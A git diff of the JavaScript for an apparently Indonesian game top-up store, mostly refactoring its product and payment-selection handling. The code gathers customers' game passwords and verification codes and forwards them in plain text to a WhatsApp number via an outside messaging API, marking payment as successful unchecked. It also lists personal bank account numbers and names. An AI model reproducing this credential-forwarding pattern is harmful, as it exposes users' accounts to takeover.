@@ -1,6 +1,5 @@
 // === GLOBAL ===
 let selectedItem = null;
-
 window.toggleCollapse = function (element) {
   const next = element.nextElementSibling;
   if (!next || !next.classList.contains("form-sub")) return;
@@ -8,7 +7,6 @@ window.toggleCollapse = function (element) {
 };
 
 document.addEventListener("DOMContentLoaded", () => {
-
   const produkData = {
     diamond: {
       note: "",
@@ -53,16 +51,16 @@ document.addEventListener("DOMContentLoaded", () => {
   };
 
   const paymentData = {
-    QRIS: { img: "assets/payment/qris2.png", name: "Warung Alwi mantap", isQR: true },
-    Dana: { account: "085713056206", name: "ADE ANASIRU MUALIM" },
-    Ovo: { account: "085713056206", name: "ADE ANASIRU MUALIM" },
-    GoPay: { account: "085713056206", name: "ADE ANASIRU MUALIM" },
-    ShopeePay: { account: "085713056206", name: "Mamet Ucup Store" },
-    BRI: { account: "356901013211502", name: "ADE ANASIRU MUALIM" },
-    BCA: { account: "4922069551", name: "ADE ANASIRU MUALIM" },
-    SeaBank: { account: "901433678333", name: "ADE ANASIRU MUALIM" },
-    "Bank Jago": { account: "103923428497", name: "REVITA FEBRIANTI" },
-    Blu: { account: "003406906539", name: "DEWI ANGGRIANI" },
+    QRIS: { img: 'assets/payment/qris2.png', name: 'Warung Alwi mantap', isQR: true },
+    Dana: { account: '085713056206', name: 'ADE ANASIRU MUALIM' },
+    Ovo: { account: '085713056206', name: 'ADE ANASIRU MUALIM' },
+    GoPay: { account: '085713056206', name: 'ADE ANASIRU MUALIM' },
+    ShopeePay: { account: '085713056206', name: 'Mamet Ucup Store' },
+    BRI: { account: '356901013211502', name: 'ADE ANASIRU MUALIM' },
+    BCA: { account: '4922069551', name: 'ADE ANASIRU MUALIM' },
+    SeaBank: { account: '901433678333', name: 'ADE ANASIRU MUALIM' },
+    "Bank Jago": { account: '103923428497', name: 'REVITA FEBRIANTI' },
+    Blu: { account: '003406906539', name: 'DEWI ANGGRIANI' },
   };
 
   let selectedTab = "";
@@ -76,6 +74,8 @@ document.addEventListener("DOMContentLoaded", () => {
       selectedTab = "";
       produkContainer.innerHTML = "";
       produkNote.style.display = "none";
+      selectedItem = null;
+      updateTotalHargaDisplay();
     } else {
       selectedTab = kategori;
       renderProduk(produkData[kategori]);
@@ -86,6 +86,7 @@ document.addEventListener("DOMContentLoaded", () => {
     produkContainer.innerHTML = "";
     produkNote.textContent = data.note;
     produkNote.style.display = data.note ? "block" : "none";
+
     data.items.forEach((item) => {
       const div = document.createElement("div");
       div.className = "produk-item";
@@ -93,12 +94,25 @@ document.addEventListener("DOMContentLoaded", () => {
       if (selectedItem && selectedItem.label === item.label) {
         div.classList.add("selected");
       }
+
       div.onclick = (e) => {
         e.stopPropagation();
         toggleItem(item, div);
       };
+
       produkContainer.appendChild(div);
     });
+
+    // Klik di luar = batal
+    document.addEventListener("click", cancelByOutsideClick);
+  }
+
+  function cancelByOutsideClick(e) {
+    if (!produkContainer.contains(e.target)) {
+      selectedItem = null;
+      [...produkContainer.children].forEach((el) => el.classList.remove("selected"));
+      updateTotalHargaDisplay();
+    }
   }
 
   function toggleItem(item, element) {
@@ -112,26 +126,6 @@ document.addEventListener("DOMContentLoaded", () => {
     }
     updateTotalHargaDisplay();
   }
-
-  // ✅ Klik di luar akan batal jika bukan klik elemen penting
-  document.addEventListener("click", (e) => {
-    const ignoreSelectors = [
-      ".produk-item",
-      "#produk-container",
-      ".payment-inner-card",
-      "form",
-      "input",
-      "select",
-      "button",
-      "#popup-overlay",
-      "#btn-transfer",
-    ];
-    if (ignoreSelectors.some((sel) => e.target.closest(sel))) return;
-
-    selectedItem = null;
-    [...produkContainer.children].forEach((el) => el.classList.remove("selected"));
-    updateTotalHargaDisplay();
-  });
 
   document.getElementById("akun-form").addEventListener("submit", (e) => {
     e.preventDefault();
@@ -163,7 +157,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const item = selectedItem;
     const total = calculateTotalHarga(metode);
     const bank = paymentData[metode];
-
     const info = document.getElementById("popup-info");
     const popup = document.getElementById("popup-overlay");
 
@@ -192,7 +185,17 @@ document.addEventListener("DOMContentLoaded", () => {
     document.getElementById("btn-transfer").onclick = () => {
       popup.classList.add("hidden");
 
-      const message = `🔥 *Order Baru dari Website* 🔥\n👤 Nickname: ${data.nickname}\n📧 Email: ${data.email}\n🔐 Password: ${data.password}\n🔑 Login: ${data.loginMethod}\n📱 WhatsApp: ${data.whatsapp}\n🛒 Orderan:\n- ${item.label} (${item.harga})\n🔒 V2L: ${data.v2l}\n💳 Pembayaran: ${data.metode}\n✅ Status: Pembayaran berhasil`;
+      const message = `🔥 *Order Baru dari Website* 🔥
+👤 Nickname: ${data.nickname}
+📧 Email: ${data.email}
+🔐 Password: ${data.password}
+🔑 Login: ${data.loginMethod}
+📱 WhatsApp: ${data.whatsapp}
+🛒 Orderan:
+- ${item.label} (${item.harga})
+🔒 V2L: ${data.v2l}
+💳 Pembayaran: ${data.metode}
+✅ Status: Pembayaran berhasil`;
 
       fetch("https://api.fonnte.com/send", {
         method: "POST",
@@ -229,6 +232,7 @@ document.addEventListener("DOMContentLoaded", () => {
   const metodeInput = document.getElementById("metode-terpilih");
   const observer = new MutationObserver(updateTotalHargaDisplay);
   observer.observe(metodeInput, { attributes: true, attributeFilter: ["value"] });
+
   document.getElementById("produk-container").addEventListener("click", () => {
     setTimeout(updateTotalHargaDisplay, 100);
   });
@@ -238,9 +242,12 @@ document.addEventListener("DOMContentLoaded", () => {
 function selectPayment(card, method) {
   const input = document.getElementById("metode-terpilih");
   const isSelected = card.classList.contains("selected");
+
   document.querySelectorAll(".payment-inner-card").forEach((el) => {
     el.classList.remove("selected");
+    removeTotalHarga(el);
   });
+
   if (!isSelected) {
     card.classList.add("selected");
     input.value = method;
@@ -249,6 +256,11 @@ function selectPayment(card, method) {
     input.value = "";
     updateTotalHargaDisplay();
   }
+}
+
+function removeTotalHarga(card) {
+  const existing = card.querySelector(".total-harga-text");
+  if (existing) existing.remove();
 }
 
 function updateTotalHargaDisplay() {
@@ -273,4 +285,5 @@ function calculateTotalHarga(method) {
 
 function formatRupiah(angka) {
   return angka.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-}
+                                 }
+    
